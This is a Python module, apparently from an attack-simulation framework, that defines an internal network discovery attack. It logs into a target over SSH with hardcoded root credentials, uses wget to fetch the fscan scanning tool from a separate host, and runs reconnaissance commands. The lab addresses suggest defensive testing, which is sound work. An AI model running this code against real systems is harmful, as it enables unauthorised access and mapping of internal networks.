from attacks import Attack, AttackInfo, AttackOptions
from attacks.attack_network_info_gather import NetworkInfoGatherAttackOptions, NetworkInfoGatherAttack

class InternalAttackOptions(AttackOptions):
    ssh_host = "Login SSH Host"
    ssh_username = "Login SSH Username"
    ssh_password = "Login SSH Password"
    ssh_port = "Login SSH Port"

    def _set_defaults(self):
        self.ssh_host = "172.18.0.2"
        self.ssh_username = "root"
        self.ssh_password = "breach"
        self.ssh_port = "222"


class InternalNetworkInfoGatherAttackOptions(NetworkInfoGatherAttackOptions, InternalAttackOptions):
    url = "Tool URL"

    def _set_defaults(self):
        NetworkInfoGatherAttackOptions._set_defaults(self)
        InternalAttackOptions._set_defaults(self)
        self.network = "172.16.0.0/16"
        self.hosts = "172.16.0.2-3"
        self.url = "http://172.18.1.1/fscan"


class InternalNetworkInfoGatherAttack(NetworkInfoGatherAttack):
    info = AttackInfo(
        name="discovery_network_gather",
        description="internal network information discovery using ssh")
    options_class = InternalNetworkInfoGatherAttackOptions

    def run(self):
        self.connect_to_target()
        commands = self._download_tool_command()
        commands.extend(self.network_info_gather_commands())
        with self.wrap_ssh_exceptions():
            self.exec_commands_on_shell(commands)

    def _download_tool_command(self):
        password = self.options.ssh_password
        username = self.options.ssh_username
        host = self.options.ssh_host
        port = self.options.ssh_port
        return [
            f"sshpass -p {password} ssh {username}@{host} -p {port}",
            f"wget {self.options.url} -O {self.options.tool}",
        ]
